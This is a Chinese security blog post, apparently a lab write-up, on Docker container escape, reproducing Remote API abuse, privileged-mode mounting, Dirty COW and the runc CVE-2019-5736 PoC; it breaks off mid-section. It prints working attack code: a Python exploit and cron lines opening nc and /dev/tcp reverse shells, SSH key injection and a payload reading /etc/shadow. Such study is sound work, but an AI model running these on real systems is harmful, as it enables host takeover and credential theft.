<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>Docker逃逸 | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"人生路漫漫","version":"1.3.0","mode":"time","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta property="og:type" content="article">
<meta property="og:title" content="Docker逃逸">
<meta property="og:url" content="https://m0re.top/posts/abcd4c1e/index.html">
<meta property="og:site_name" content="m0re的小站">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20210328112744.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986474417-2cf8dd83-c285-43fe-80bb-9f5e700d0c95.png?x-oss-process=image/resize,w_870#align=left&display=inline&height=94&margin=%5Bobject%20Object%5D&originHeight=94&originWidth=870&status=done&style=none&width=870">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986846345-9d76e9e3-905d-49e6-beef-10248d206858.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&originHeight=336&originWidth=1196&status=done&style=none&width=1196">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610987265429-9dfc2f76-d3f9-4761-ab12-9bc7818103fa.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&originHeight=411&originWidth=894&status=done&style=none&width=894">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990122639-1dbc1921-05b3-4b83-8dd9-b4640540abdb.png?x-oss-process=image/resize,w_752#align=left&display=inline&height=307&margin=%5Bobject%20Object%5D&originHeight=307&originWidth=752&status=done&style=none&width=752">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990143195-8b65a2ff-e4b7-4569-bd56-cae1df4bc1c6.png?x-oss-process=image/resize,w_910#align=left&display=inline&height=645&margin=%5Bobject%20Object%5D&originHeight=645&originWidth=910&status=done&style=none&width=910">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990857682-a391dc86-4919-47e2-88c1-35298bcd541d.png?x-oss-process=image/resize,w_1612#align=left&display=inline&height=213&margin=%5Bobject%20Object%5D&originHeight=213&originWidth=1612&status=done&style=none&width=1612">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995008915-5cbb3ff7-5a9f-444f-abaf-1c70eaae0327.png#align=left&display=inline&height=159&margin=%5Bobject%20Object%5D&originHeight=159&originWidth=886&status=done&style=none&width=886">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995191722-eca1a2cb-3167-42a8-93d6-98c2d3c4c858.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=248&originWidth=946&status=done&style=none&width=946">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056709262-0c02176e-f220-47ff-85a4-abcbe2cec8ef.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=860&status=done&style=none&width=860">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056870001-f0533c4f-06b5-4b9f-a3ef-51aea5bd2417.png?x-oss-process=image/resize,w_1362#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&originHeight=228&originWidth=1362&status=done&style=none&width=1362">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818216-fd6cd56e-7e7f-4fa7-a825-6ec85c42797b.png#align=left&display=inline&height=261&margin=%5Bobject%20Object%5D&originHeight=261&originWidth=734&size=0&status=done&style=none&width=734">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818230-31aa81c0-8584-49ba-a3fc-65b6ff93e9e9.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=183&originWidth=857&size=0&status=done&style=none&width=857">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818250-e2ca6c32-5111-434a-a278-b72e8fd60658.png#align=left&display=inline&height=509&margin=%5Bobject%20Object%5D&originHeight=509&originWidth=831&size=0&status=done&style=none&width=831">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818276-188781c9-5aee-43a6-8364-d5e20e04cb11.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&originHeight=100&originWidth=599&size=0&status=done&style=none&width=599">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818201-2b418c11-3f0b-404c-8a76-1793033df13f.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&originHeight=158&originWidth=717&size=0&status=done&style=none&width=717">
<meta property="article:published_time" content="2021-03-28T03:23:23.799Z">
<meta property="article:modified_time" content="2021-03-28T03:28:37.305Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="Docker逃逸">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/20210328112744.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="穷鬼啊啊啊啊">😭</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><a class="site-name" href="/about/site.html">m0re的小站</a><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">91</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">38</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%B7%A5%E4%BD%9C%E5%9C%A8Docker%E7%8E%AF%E5%A2%83%E4%B8%AD"><span class="toc-number">1.1.</span> <span class="toc-text">判断是否工作在Docker环境中</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">Docker逃逸方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.1.</span> <span class="toc-text">Docker Remote API 未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-%E9%AB%98%E5%8D%B1%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0-%E2%80%93-privileged-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">Docker 高危启动参数 – privileged 特权模式启动容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dirty-COW%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">2.3.</span> <span class="toc-text">Dirty COW漏洞逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text">runc容器逃逸漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-cp%E5%91%BD%E4%BB%A4%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-14271%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">Docker cp命令可导致容器逃逸攻击漏洞（CVE-2019-14271）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD%E5%AF%BC%E8%87%B4Docker-%E9%80%83%E9%80%B8"><span class="toc-number">2.6.</span> <span class="toc-text">危险挂载导致Docker 逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/abcd4c1e/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Docker逃逸</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-03-28 11:23:23" itemprop="dateCreated datePublished" datetime="2021-03-28T11:23:23+08:00">2021-03-28</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/abcd4c1e/" data-flag-title="Docker逃逸"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/Docker/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Docker</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/Docker%E9%80%83%E9%80%B8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Docker逃逸</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210328112744.png" alt="m0re" loading="lazy"></p>
<a id="more"></a>
<p><a name="df368884"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><br />Docker是现在使用范围最广的开源容器技术之一，因为最近用docker用的比较多，所以就接触到了docker相关的漏洞知识——docker逃逸技术。<br />##Docker逃逸<br />利用场景：在拿到一个shell后，发现是开启的Docker环境，然而需要进一步渗透主机，所以就需要从Docker里面逃逸出来到宿主机器。之后再跟着这个师傅的文章进行学习虚拟机逃逸，因为有些Docker会在虚拟机中运行。要拿到主机不仅需要Docker逃逸，还需要从虚拟机逃逸。<br />原因：<br />一、配置不当<br />二、由内核漏洞引起<br />三、由docker软件设计引起<br />四。挂载危险目录<br /></p>
<p><a name="f0d77804"></a></p>
<h3 id="判断是否工作在Docker环境中"><a href="#判断是否工作在Docker环境中" class="headerlink" title="判断是否工作在Docker环境中"></a>判断是否工作在Docker环境中</h3><ol>
<li>Metasploit 中的 checkcontainer 模块、（判断是否为虚拟机，checkvm 模块）<br />该模块其实进行了如下操作：<br />检查根目录下有无.dockerenv文件<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986474417-2cf8dd83-c285-43fe-80bb-9f5e700d0c95.png?x-oss-process=image/resize,w_870#align=left&display=inline&height=94&margin=%5Bobject%20Object%5D&originHeight=94&originWidth=870&status=done&style=none&width=870" loading="lazy"><br />注意：定制化比较高的docker系统也可能没有这个文件<br />检查/proc/1/cgroup 是否存在有docker字符串<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986846345-9d76e9e3-905d-49e6-beef-10248d206858.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&originHeight=336&originWidth=1196&status=done&style=none&width=1196" loading="lazy"></li>
</ol>
<ul>
<li>kvm环境或者物理机环境下：cat /proc/1/cgroup<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610987265429-9dfc2f76-d3f9-4761-ab12-9bc7818103fa.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&originHeight=411&originWidth=894&status=done&style=none&width=894" loading="lazy"></li>
</ul>
<p><a name="340686b5"></a></p>
<h2 id="Docker逃逸方法"><a href="#Docker逃逸方法" class="headerlink" title="Docker逃逸方法"></a>Docker逃逸方法</h2><p><br />这里复现几种Docker逃逸的几种方法，复现参考均来自互联网。<br /></p>
<p><a name="69e222e0"></a></p>
<h3 id="Docker-Remote-API-未授权访问"><a href="#Docker-Remote-API-未授权访问" class="headerlink" title="Docker Remote API 未授权访问"></a>Docker Remote API 未授权访问</h3><blockquote>
<p>环境：Kali&amp;  Ubuntu&gt;docker<br>Vulhub漏洞靶机：<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</a><br>参考文章<br><a target="_blank" rel="noopener" href="https://wrpzkb.cn/dkty/">https://wrpzkb.cn/dkty/</a></p>
</blockquote>
<p><br /><strong>漏洞复现</strong><br /></p>
<blockquote>
<p>启动容器，将主机的/etc目录挂载到容器中，就可以任意读写文件，而漏洞所需即是将命令写入crontab配置文件，进行反弹shell。</p>
</blockquote>
<p><br />exp<br /></p>
<pre class="language-none"><code class="language-none">import docker
client &#x3D; docker.DockerClient(base_url&#x3D;&#39;http:&#x2F;&#x2F;your-ip:2375&#x2F;&#39;)
data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * &#x2F;usr&#x2F;bin&#x2F;nc your-ip 1111 -e &#x2F;bin&#x2F;sh&#39; &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root&quot; &#39;&#39;&#39;, remove&#x3D;True, volumes&#x3D;&#123;&#39;&#x2F;etc&#39;: &#123;&#39;bind&#39;: &#39;&#x2F;tmp&#x2F;etc&#39;, &#39;mode&#39;: &#39;rw&#39;&#125;&#125;)</code></pre>

<p><br />复现过程<br /></p>
<pre class="language-none"><code class="language-none">root@test:&#x2F;# cd &#x2F;vulhub&#x2F;docker&#x2F;unauthorized-rce&#x2F;</code></pre>

<p><br />编译和启动docker环境<br /></p>
<pre class="language-none"><code class="language-none">docker-compose build
docker-compose up -d</code></pre>

<p><br />环境启动成功，kali中尝试访问2375端口<br />浏览器中查看，如此便是存在该漏洞。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990122639-1dbc1921-05b3-4b83-8dd9-b4640540abdb.png?x-oss-process=image/resize,w_752#align=left&display=inline&height=307&margin=%5Bobject%20Object%5D&originHeight=307&originWidth=752&status=done&style=none&width=752" loading="lazy"><br /></p>
<pre class="language-none"><code class="language-none">&lt;ip&gt;:2379&#x2F;version
&lt;ip&gt;:2379&#x2F;info</code></pre>

<p><br />查看目标的基本信息<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990143195-8b65a2ff-e4b7-4569-bd56-cae1df4bc1c6.png?x-oss-process=image/resize,w_910#align=left&display=inline&height=645&margin=%5Bobject%20Object%5D&originHeight=645&originWidth=910&status=done&style=none&width=910" loading="lazy"><br />若能访问，证明存在未授权访问漏洞<br />漏洞利用<br />此时进入容器是需要用<code>/bin/sh</code>而不是<code>/bin/bash</code><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990857682-a391dc86-4919-47e2-88c1-35298bcd541d.png?x-oss-process=image/resize,w_1612#align=left&display=inline&height=213&margin=%5Bobject%20Object%5D&originHeight=213&originWidth=1612&status=done&style=none&width=1612" loading="lazy"><br />然后执行<br /></p>
<pre class="language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;ip:2375 images</code></pre>

<p><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995008915-5cbb3ff7-5a9f-444f-abaf-1c70eaae0327.png#align=left&display=inline&height=159&margin=%5Bobject%20Object%5D&originHeight=159&originWidth=886&status=done&style=none&width=886" loading="lazy"><br />随后将这个docker容器启动起来，<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995191722-eca1a2cb-3167-42a8-93d6-98c2d3c4c858.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=248&originWidth=946&status=done&style=none&width=946" loading="lazy"><br />挂载<br /></p>
<pre class="language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;ip:2375 run -it -v &#x2F;:&#x2F;mnt 7731472c3f2a &#x2F;bin&#x2F;sh</code></pre>

<p><br />在Kali执行exp，先侦听端口，然后执行exp<br /></p>
<pre class="language-none"><code class="language-none">nc -l -p 1111
python3 exp.py</code></pre>

<p><br />执行完成过后等待一段时间即可getshell。<br />注意：在kali中执行该脚本，需要kali安装docker，并且Python3需要安装docker模块。<br />需要满足上面这两个条件，否则不成功。即不显示任何docker容器信息。<br /></p>
<p><a name="95f40102"></a></p>
<h3 id="Docker-高危启动参数-–-privileged-特权模式启动容器"><a href="#Docker-高危启动参数-–-privileged-特权模式启动容器" class="headerlink" title="Docker 高危启动参数 – privileged 特权模式启动容器"></a>Docker 高危启动参数 – privileged 特权模式启动容器</h3><blockquote>
<p>当操作者执行docker run –privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</p>
</blockquote>
<p><br />特权模式启动一个Ubuntu容器：<br /></p>
<pre class="language-none"><code class="language-none">sudo docker run -itd --privileged ubuntu:latest &#x2F;bin&#x2F;bash</code></pre>

<p><br />进入容器：<br />使用<code>fdisk</code>命令查看磁盘文件：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056709262-0c02176e-f220-47ff-85a4-abcbe2cec8ef.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=860&status=done&style=none&width=860" loading="lazy"><br /></p>
<blockquote>
<p>在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。</p>
</blockquote>
<p><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056870001-f0533c4f-06b5-4b9f-a3ef-51aea5bd2417.png?x-oss-process=image/resize,w_1362#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&originHeight=228&originWidth=1362&status=done&style=none&width=1362" loading="lazy"><br />成功逃逸。<br />然后就是计划任务拿shell<br /></p>
<pre class="language-none"><code class="language-none">echo &#39;* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.130&#x2F;4444 0&gt;&amp;1&#39; &gt;&gt; &#x2F;test&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</code></pre>

<p><br />或者将宿主机的root目录挂载到容器<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -itd -v /root:/root ubuntu:18.04 /bin/bash</code></pre>

<p><br />写入一个ssh密钥<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /root/.ssh
<span class="token function">cat</span> id_rsa.pub <span class="token operator">>></span> /root/.ssh/authorized_keys
<span class="token comment">#然后使用ssh私钥远程登录</span>
<span class="token function">ssh</span> root@192.168.137.129</code></pre>


<p><a name="e3402d5b"></a></p>
<h3 id="Dirty-COW漏洞逃逸"><a href="#Dirty-COW漏洞逃逸" class="headerlink" title="Dirty COW漏洞逃逸"></a>Dirty COW漏洞逃逸</h3><p><br />Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，原因是由于Linux内核的内存子系统在处理写入时拷贝存在竞争，允许恶意用户提权获取其他只读映射的写权限。<br /></p>
<blockquote>
<p>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可以在其目标系统内提升权限，甚至获取到root权限。</p>
</blockquote>
<p><br />这里使用i春秋的靶场环境进行复现。<br /></p>
<blockquote>
<p>地址：chunqiu.com/experiment/catalog?id=100295<br>poc所在的GitHub项目：<a target="_blank" rel="noopener" href="https://github.com/whu-enjoy/CVE-2016-5195">https://github.com/whu-enjoy/CVE-2016-5195</a></p>
</blockquote>
<p><br />首先打开环境后需要运行docker，由于环境中已经给了镜像，只需要创建相应容器即可<br /></p>
<pre class="language-none"><code class="language-none">docker run --name&#x3D;m0re -p 1234:1234 -itd dirtycow &#x2F;bin&#x2F;bash
#进入容器
docker exec -it m0re &#x2F;bin&#x2F;bash</code></pre>

<p><br />环境里有现成的POC，直接使用即可。make编译c文件，然后执行<code>./0xdeadbeef</code><br />出现successfully即为成功<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818216-fd6cd56e-7e7f-4fa7-a825-6ec85c42797b.png#align=left&display=inline&height=261&margin=%5Bobject%20Object%5D&originHeight=261&originWidth=734&size=0&status=done&style=none&width=734" loading="lazy"><br />就已经获取到宿主机的shell了，接下来进行验证。<br />这个时候进入home文件夹，可以看到有一个user的文件夹，然后在此处创建一个新的文件夹。<br />退出环境后发现了在宿主机的home文件夹中也出现了<code>m0re</code>这个文件，而且是属于root用户组的<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818230-31aa81c0-8584-49ba-a3fc-65b6ff93e9e9.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=183&originWidth=857&size=0&status=done&style=none&width=857" loading="lazy"><br />这个就是成功利用了，DirtyCow实现了docker逃逸。<br /></p>
<p><a name="4f201b6f"></a></p>
<h3 id="runc容器逃逸漏洞"><a href="#runc容器逃逸漏洞" class="headerlink" title="runc容器逃逸漏洞"></a>runc容器逃逸漏洞</h3><p><br />runc容器逃逸漏洞(CVE-2019-5736 )原理<br /></p>
<blockquote>
<p>docker或者是其他基于runc的容器运行时存在的安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取宿主机runc执行时的文件句柄并修改runc的二进制文件，从而获取宿主机的root权限。</p>
</blockquote>
<blockquote>
<p>runc：是一个轻量级的用来运行容器的工具，它可以不通过docker引擎，直接运行容器。runc目前只支持Linux平台。</p>
</blockquote>
<p><br />影响范围：Docker版本 &lt; 18.09.2 或者使用 runc版本 &lt;= 1.0-rc6的环境<br />漏洞复现：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC/">https://github.com/Frichetten/CVE-2019-5736-PoC/</a><br />环境搭建，使用网上公开的环境：<a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw">https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw</a><br />一步搭建并进入容器<br /></p>
<pre class="language-none"><code class="language-none">curl https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;thinkycx&#x2F;e2c9090f035d7b09156077903d6afa51&#x2F;raw -o install.sh &amp;&amp; bash install.sh</code></pre>

<p><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818250-e2ca6c32-5111-434a-a278-b72e8fd60658.png#align=left&display=inline&height=509&margin=%5Bobject%20Object%5D&originHeight=509&originWidth=831&size=0&status=done&style=none&width=831" loading="lazy"><br /><br><br />然后下载POC，修改相应脚本<br />修改 <code>vi main.go</code><br /></p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; This is the line of shell commands that will execute on the host
var payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \n cat &#x2F;etc&#x2F;shadow &gt; &#x2F;tmp&#x2F;shadow &amp;&amp; chmod 777 &#x2F;tmp&#x2F;shadow&quot;
修改为反弹shell的命令
